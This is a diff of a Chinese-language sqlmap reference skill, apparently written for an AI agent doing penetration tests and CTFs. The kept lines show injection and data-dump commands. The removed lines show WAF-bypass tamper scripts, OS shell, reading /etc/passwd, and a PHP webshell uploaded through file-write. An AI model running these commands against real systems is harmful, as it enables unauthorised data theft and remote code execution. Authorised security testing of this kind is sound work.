@@ -1,6 +1,6 @@
 ---
 name: sqlmap-advanced
-description: "sqlmap 高级用法完整参考。当确认存在 SQL 注入需要用 sqlmap 自动化利用时使用。覆盖 POST/Cookie/Header 注入、tamper 脚本选择、--technique 精确控制、二次注入(--second-url)、OS shell/文件读写、数据库提取优化、代理/编码配置。任何需要使用 sqlmap 的场景都应参考此 skill，包括 CTF 和渗透测试。与 sql-injection-methodology 配合使用——该 skill 负责手工检测和原理，本 skill 专注 sqlmap 工具用法"
+description: "sqlmap 高级用法完整参考。当确认存在 SQL 注入需要用 sqlmap 自动化利用时使用。覆盖 POST/Cookie/Header 注入、tamper 脚本选择、--technique 精确控制、二次注入、OS shell/文件读写、数据库提取优化"
 metadata:
   tags: "sqlmap,sql injection,tool,tamper,bypass,waf,os-shell,file-read,file-write,数据库,注入工具"
   category: "tool"
@@ -8,7 +8,7 @@ metadata:
 
 # sqlmap 高级用法完整参考
 
-## ⛔ 超时控制（强制执行）
+## 超时控制（强制执行）
 
 sqlmap 可能运行很长时间。**必须用 timeout 包裹**：
 
@@ -17,6 +17,11 @@ timeout 480 sqlmap [参数] --batch 2>&1 | tee /tmp/sqlmap_output.log
 # 超时后立即查看已有结果
 tail -80 /tmp/sqlmap_output.log
 ```
+
+## 深入参考
+
+- tamper 脚本速查表 → [references/tamper-reference.md](references/tamper-reference.md)
+- 高级用法详细命令（OS Shell/文件读写/二次注入/性能调优） → [references/advanced-usage.md](references/advanced-usage.md)
 
 ---
 
@@ -46,7 +51,7 @@ timeout 480 sqlmap -u 'http://target/login.php' \
 ```bash
 timeout 480 sqlmap -u 'http://target/page.php' \
     --cookie 'user_id=1; session=abc123' \
-    --level 3 \  # level ≥ 3 才测试 Cookie
+    --level 3 \
     --batch --random-agent \
     2>&1 | tee /tmp/sqlmap_output.log
 ```
@@ -56,7 +61,7 @@ timeout 480 sqlmap -u 'http://target/page.php' \
 ```bash
 timeout 480 sqlmap -u 'http://target/page.php' \
     --headers 'X-Forwarded-For: 127.0.0.1*' \
-    --level 5 \  # level 5 测试所有 header
+    --level 5 \
     --batch --random-agent \
     2>&1 | tee /tmp/sqlmap_output.log
 ```
@@ -66,7 +71,6 @@ timeout 480 sqlmap -u 'http://target/page.php' \
 ### 从 Burp 请求文件
 
 ```bash
-# 保存 Burp 拦截的请求到文件
 timeout 480 sqlmap -r /tmp/request.txt \
     --batch --random-agent --level 2 --risk 2 \
     2>&1 | tee /tmp/sqlmap_output.log
@@ -88,9 +92,6 @@ timeout 480 sqlmap -r /tmp/request.txt \
 ```bash
 # 只用 UNION + Error（最快）
 sqlmap -u 'URL' --technique EU --batch
-
-# 只用布尔盲注（精确但慢）
-sqlmap -u 'URL' --technique B --batch
 
 # 跳过耗时的时间盲注
 sqlmap -u 'URL' --technique BEUS --batch
@@ -124,125 +125,6 @@ sqlmap -u 'URL' -D target_db -T users --dump --start 1 --stop 10 --batch
 # 7. 搜索关键表/列
 sqlmap -u 'URL' --search -T flag --batch
 sqlmap -u 'URL' --search -C password --batch
-```
-
----
-
-## Phase 4: WAF 绕过（tamper 脚本）
-
-### tamper 选择速查
-
-| 目标数据库 | 推荐 tamper 组合 |
-|-----------|------------------|
-| MySQL (通用) | `space2comment,between,randomcase` |
-| MySQL (强 WAF) | `space2comment,equaltolike,greatest,halfversionedmorekeywords` |
-| MSSQL | `space2comment,between,charencode` |
-| PostgreSQL | `space2comment,between` |
-| 通用编码绕过 | `charencode,chardoubleencode` |
-| 内联注释 | `versionedmorekeywords,halfversionedmorekeywords` |
-
-```bash
-# 基础 WAF 绕过
-timeout 480 sqlmap -u 'URL' \
-    --tamper=space2comment,between,randomcase \
-    --random-agent --batch \
-    2>&1 | tee /tmp/sqlmap_output.log
-
-# 强 WAF 绕过
-timeout 480 sqlmap -u 'URL' \
-    --tamper=space2comment,equaltolike,greatest,charencode \
-    --random-agent --delay 1 --batch \
-    2>&1 | tee /tmp/sqlmap_output.log
-```
-
-### 常用 tamper 脚本说明
-
-| tamper | 作用 |
-|--------|------|
-| `space2comment` | 空格 → `/**/` |
-| `between` | `>` → `BETWEEN` |
-| `randomcase` | 关键字随机大小写 |
-| `equaltolike` | `=` → `LIKE` |
-| `charencode` | 字符 URL 编码 |
-| `chardoubleencode` | 字符双重 URL 编码 |
-| `greatest` | `>` → `GREATEST(x,y)` |
-| `halfversionedmorekeywords` | MySQL 内联注释 |
-| `apostrophenullencode` | `'` → `%00'` |
-| `base64encode` | Base64 编码 payload |
-
----
-
-## Phase 5: 高级利用
-
-### OS Shell（获取系统命令执行）
-
-```bash
-# 条件：数据库用户有 FILE 权限 + 已知可写 Web 目录
-timeout 480 sqlmap -u 'URL' --os-shell --batch \
-    2>&1 | tee /tmp/sqlmap_output.log
-
-# 指定 Web 根目录
-sqlmap -u 'URL' --os-shell --web-root /var/www/html --batch
-```
-
-### 文件读写
-
-```bash
-# 读取文件
-sqlmap -u 'URL' --file-read=/etc/passwd --batch
-
-# 写入文件（上传 webshell）
-echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
-sqlmap -u 'URL' --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php --batch
-```
-
-### SQL Shell
-
-```bash
-# 进入交互式 SQL 查询
-sqlmap -u 'URL' --sql-shell --batch
-```
-
-### 二次注入 (Second-Order)
-
-```bash
-# 注入点和触发点不同
-# --second-url: 注入后访问此 URL 检查结果
-timeout 480 sqlmap -u 'http://target/register' \
-    --data 'username=test&password=pass' \
-    --second-url 'http://target/profile' \
-    --batch --level 3 \
-    2>&1 | tee /tmp/sqlmap_output.log
-```
-
----
-
-## Phase 6: 性能调优
-
-```bash
-# 多线程（默认 1，提高到 10）
-sqlmap -u 'URL' --threads 10 --batch
-
-# 指定数据库类型（跳过指纹识别）
-sqlmap -u 'URL' --dbms mysql --batch
-
-# 指定注入点（跳过其他参数测试）
-sqlmap -u 'URL' -p id --batch
-
-# 使用代理
-sqlmap -u 'URL' --proxy http://127.0.0.1:8080 --batch
-
-# 通过 SOCKS5 代理（内网渗透）
-sqlmap -u 'URL' --proxy socks5://127.0.0.1:1080 --batch
-
-# 自定义 User-Agent
-sqlmap -u 'URL' --user-agent 'Mozilla/5.0' --batch
-
-# 保持会话
-sqlmap -u 'URL' --cookie 'PHPSESSID=xxx' --batch
-
-# 跟随重定向
-sqlmap -u 'URL' --follow-redirect --batch
 ```
 
 ---
